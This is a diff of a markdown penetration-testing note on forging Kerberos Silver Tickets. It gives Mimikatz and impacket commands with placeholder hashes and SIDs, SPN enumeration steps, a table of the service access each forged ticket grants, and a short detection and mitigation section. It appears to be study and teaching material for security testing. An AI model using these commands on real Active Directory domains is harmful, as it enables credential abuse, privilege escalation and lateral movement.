@@ -72,7 +72,7 @@ PS> powershell -ep bypass
 PS> . .\Invoke-Mimikatz.ps1
 
 Normal SPN Silver ticket:
-mimikatz # kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN_FQDN /ptt /target:TARGET_SYSTEM_FQDN /service:SPN_PROTOCOL /rc4:NTLM_HASH /user:DOMAIN_USER
+mimikatz # kerberos::golden /sid:TARGET_DOMAIN_SID /domain:TARGET_DOMAIN_FQDN /ptt /target:TARGET_SYSTEM_FQDN /service:SPN_PROTOCOL /rc4:NTLM_HASH /user:DOMAIN_USER
 
 DC Silver ticket:
 PS> Invoke-Mimikatz -Command '"kerberos::golden /domain:DOMAIN_FQDN /sid:DOMAIN_SID /target:TARGET_SYSTEM_FQDN /service:CIFS /rc4:NTLM_HASH /user:ADM_USER /ptt"'
@@ -119,6 +119,9 @@ mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domai
 iwr -UseDefaultCredentials http://web04
 ```
 
+> [!Note]
+> If the ticket is being "cached" in some way, run `klist purge` and exit the current session (powershell, psexec, etc) and reopen it and re-run all the commands to forge the correct service ticket again and access the service.
+
 # From Linux (recommended)
 
 1. Import Active Directory:
@@ -134,6 +137,9 @@ Get-ADDomain
 3. Get target SPN (for kerberoastable account):
 ```powershell
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+# trusted domain:
+Get-DomainUser -Domain <Target_Domain_FQDN> -SPN | Select-Object samaccountname, serviceprincipalname
 ```
 
 4. If we have the NTLM hash of the target user dont do anything, in other case, we have to convert it to NTLM hash:
@@ -207,3 +213,35 @@ kdc = DC_FQDN
 ```
 $ impacket-mssqlclient -q TARGET
 ```
+
+# Common SPN services
+
+The `/service` (or `-spn`) value determines what you can reach with the forged ticket:
+
+| Service | Access granted |
+| --- | --- |
+| `CIFS` | File shares (`\\host\c$`), remote file access |
+| `HOST` | Scheduled tasks, general host operations |
+| `HTTP` | Web services / WinRM / WSMan (often chains with [[WinRM]]) |
+| `MSSQLSvc` | MSSQL databases (`impacket-mssqlclient -k`) |
+| `LDAP` | Directory ops, including DCSync-style abuse |
+| `HOST` + `RPCSS` | WMI remote execution |
+
+> [!Note]
+> Unlike a [[Golden Ticket]] (forged with the `krbtgt` hash, grants domain-wide access), a Silver Ticket is scoped to **one service on one host** because it's signed with that service account's own hash. The trade-off: it never touches the KDC, so there is no TGS-REQ on the wire — quieter, but limited in reach.
+
+# Defense / Detection
+
+- Silver Tickets are hard to detect because no KDC interaction occurs. Focus on **event log correlation**: a service ticket use (Event ID 4624/4634) with **no preceding 4768/4769** on the DC is suspicious.
+- Enable **AES encryption** for service accounts — RC4 (`/rc4`) tickets stand out where AES is expected.
+- Rotate service/computer account passwords regularly (managed via **gMSA** where possible) to invalidate captured hashes.
+- Enforce **PAC validation** and monitor for tickets with anomalous lifetimes or group memberships.
+
+---
+
+### Related notes
+- [[Golden Ticket]] — the domain-wide counterpart forged with the `krbtgt` hash
+- [[Kerberoasting]] — a common way to obtain the service account hash used to forge the ticket
+- [[Impacket]] — `ticketer.py`, `getST`, `mssqlclient` used from Linux above
+- [[AD Enumeration with PowerView]] — locating SPNs and the domain SID needed as inputs
+- [[WinRM]] — turning an `HTTP`/`HOST` silver ticket into an interactive session
